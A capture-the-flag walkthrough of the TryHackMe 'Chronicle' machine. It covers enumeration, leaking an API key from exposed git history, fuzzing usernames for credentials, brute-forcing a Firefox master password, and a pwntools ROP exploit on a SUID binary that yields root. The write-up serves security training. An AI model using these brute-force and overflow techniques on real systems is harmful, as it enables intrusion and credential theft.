# Chronicle CTF [TryHackMe](https://tryhackme.com/room/chronicle)

---

![](https://www.thoughtco.com/thmb/UdP9Tep2FRd3ArOFhvBG5c3xJxc=/3917x2542/filters:fill(auto,1)/temple-of-poseidon-at-sunset-in-sounio-cape-in-attica-region--greece-825555030-5a988339875db900375b9a46.jpg)

## Overview

Find two hosted websites on the box followed by recognising one as the historic version of the other. Find and analyse the git history to leak creds! (Bruteforce required!)
Find your way through the machine and dump the credentials of another user (oh firefox...) and exploit a poorly written file with its SUID bit set! To pwntool or not to pwntool

### nmap

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Port 80

![](https://i.imgur.com/Mlsyrc9.png)

#### Port 8081

![](https://i.imgur.com/154gmzC.png)

### gobuster

```bash
$ gobuster dir -t 32 -u http://chronicle.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o gobuster/medium_80.bust
```

```bash
$ gobuster dir -t 16 -u http://chronicle.thm:8081 -w /wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt -o gobuster/medium_8081.bust
```

```
/old                  (Status: 301) [Size: 312] [--> http://chronicle.thm/old/]
```

```bash
$ gobuster dir -t 32 -u http://chronicle.thm/old -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o gobuster/medium_80_old.bust
```

```
/templates            (Status: 301) [Size: 322] [--> http://chronicle.thm/old/templates/]                                         
/.git                 (Status: 301) [Size: 317] [--> http://chronicle.thm/old/.git/]  
```

```bash
$ wget -r -q http://chronicle.thm/old/.git
```

```bash
$ git log --stat 

...[snip]
    Clearing

 app.py   | 39 ---------------------------------------
 note.txt |  1 +
 2 files changed, 1 insertion(+), 39 deletions(-)

commit 33891017aa63726711585c0a2cd5e39a80cd60e6
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:34:33 2021 +0000

    Finishing Things

 app.py               |   6 +-
 static/css/boot.css  | 803 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 static/css/login.css | 157 +++++++++++++++++++++++++++++++++++++++++
 static/js/forget.js  |  10 +++
 static/js/login.js   |  29 ++++++++
 static/js/min.js     |  16 +++++
 6 files changed, 1018 insertions(+), 3 deletions(-)

commit 25fa9929ff34c45e493e172bcb64726dfe3a2780
Author: root <cirius@incognito.com>
Date:   Fri Mar 26 22:32:19 2021 +0000

...[snip]

```

```bash
$ git show HEAD~2:app.py
```

```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/api/')
@app.route('/api')
def api():
    return "API Action Missing"

@app.route('/api/<uname>',methods=['POST'])
def info(uname):
    if(uname == ""):
        return "Username not provided"
    print("OK")
    data=request.get_json(force=True)
    print(data)
    if(data['key']=='7454[REDACTED]bc7ef'):
        if(uname=="admin"):
            return '{"username":"admin","password":"password"}'     #Default Change them as required
        elif(uname=="someone"):
            return '{"username":"someone","password":"someword"}'   #Some other user
        else:
            return 'Invalid Username'
    else:
        return "Invalid API Key"

@app.route('/forgot')
def forgot():
    return render_template('forgot.html')

app.run(host='0.0.0.0')
```


```http
POST /api/someone HTTP/1.1
Host: chronicle.thm:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/json
Content-Length: 42
Origin: http://chronicle.thm:8081
Connection: close
Referer: http://chronicle.thm:8081/forgot?
Sec-GPC: 1

{"key":"7454[REDACTED]bc7ef"}
```

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 49
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Thu, 21 Oct 2021 09:42:12 GMT

{"username":"user1","password":"password_secure"}
```

```bash
$ ffuf -fw 2 -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d '{"key":"7454[REDACTED]bc7ef"}' -u http://chronicle.thm:8081/api/FUZZ
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://chronicle.thm:8081/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Data             : {"key":"7454[REDACTED]bc7ef"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 2
________________________________________________

tommy                   [Status: 200, Size: 49, Words: 1, Lines: 1]
:: Progress: [10177/10177] :: Job [1/1] :: 27 req/sec :: Duration: [0:07:00] :: Errors: 0 ::
```

```http
POST /api/tommy HTTP/1.1
Host: chronicle.thm:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/json
Content-Length: 42
Origin: http://chronicle.thm:8081
Connection: close
Referer: http://chronicle.thm:8081/forgot?
Sec-GPC: 1

{"key":"7454[REDACTED]bc7ef"}
```

```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 49
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Thu, 21 Oct 2021 10:06:16 GMT

{"username":"tommy","password":"[REDACTED]"}
```

```bash
$ ssh -l tommy chronicle.thm
tommy@incognito:~$ ls
user.txt  web
```

```bash
$ tommy@incognito:/home/carlJ$ ls -la
total 44
drwxr-xr-x 8 carlJ carlJ 4096 Jun 11 06:22 .
drwxr-xr-x 4 root  root  4096 Apr  3  2021 ..
lrwxrwxrwx 1 root  root     9 Apr  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 carlJ carlJ  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 carlJ carlJ 3772 Mar 26  2021 .bashrc
drwx------ 4 carlJ carlJ 4096 Apr  3  2021 .cache
drwxr-x--- 3 carlJ carlJ 4096 Apr  3  2021 .config
drwx------ 3 carlJ carlJ 4096 Apr  3  2021 .gnupg
drwxrwxr-x 3 carlJ carlJ 4096 Apr 16  2021 .local
drwx------ 2 carlJ carlJ 4096 Apr 16  2021 mailing
drwxr-xr-x 5 carlJ carlJ 4096 Mar 28  2021 .mozilla
-rw-r--r-- 1 carlJ carlJ  808 Mar 26  2021 .profile
```

```bash
$ git clone https://github.com/unode/firefox_decrypt.git
```

```bash
#!/bin/bash

if [[ ! -f ./firefox_decrypt/firefox_decrypt.py ]]; then
    echo "can't find decrypter"
    exit 1
elif [[ ! -d ./firefox_creds/firefox ]]; then
    echo "cant find cred file"
    exit 2
fi

while read password; do
    if echo -e "2\n$password" | firefox_decrypt/firefox_decrypt.py ./firefox_creds/firefox &>/dev/null; then
        echo "Password found: $password"
        echo -e "2\n$password" | firefox_decrypt/firefox_decrypt.py ./firefox_creds/firefox
        exit 0
    fi
done < /usr/share/wordlists/rockyou.txt
echo "Password not found"
exit 3
```

```
Password found: [REDACTED]
Select the Mozilla profile you wish to decrypt
1 -> 45ir4czt.default
2 -> 0ryxwn4c.default-release
Reading Master password from standard input:

Website:   https://incognito.com
Username: 'dev'
Password: '[REDACTED]'
```

```bash
carlJ@incognito:~/mailing$ ls -la smail 
-rwsrwxr-x 1 root root 8544 Apr  3  2021 smail
carlJ@incognito:~/mailing$ python3 -c "print('2\n' + '\x69' * 65)" | ./smail
What do you wanna do
1-Send Message
2-Change your Signature
Write your signature...
Changed
Segmentation fault (core dumped)                             
```

```python
#!/usr/bin/env python3

from pwn import *

exploit = process('./smail')

base = 0x7ffff79e2000
sys = base + 0x4f550
shell = base + 0x1b3e1a

rop_rdi = 0x4007f3

payload = b'\x69' * 72
payload += p64(0x400556)
payload += p64(rop_rdi)
payload += p64(shell)
payload += p64(sys)
payload += p64(0x0)


exploit.clean()
exploit.sendline("2")
exploit.sendline(payload)
exploit.interactive()
```

```bash
carlJ@incognito:~/mailing$ python3 exploit.py 
[+] Starting local process './smail': pid 13225
[*] Switching to interactive mode
Write your signature...
Changed
$ whoami
root
```
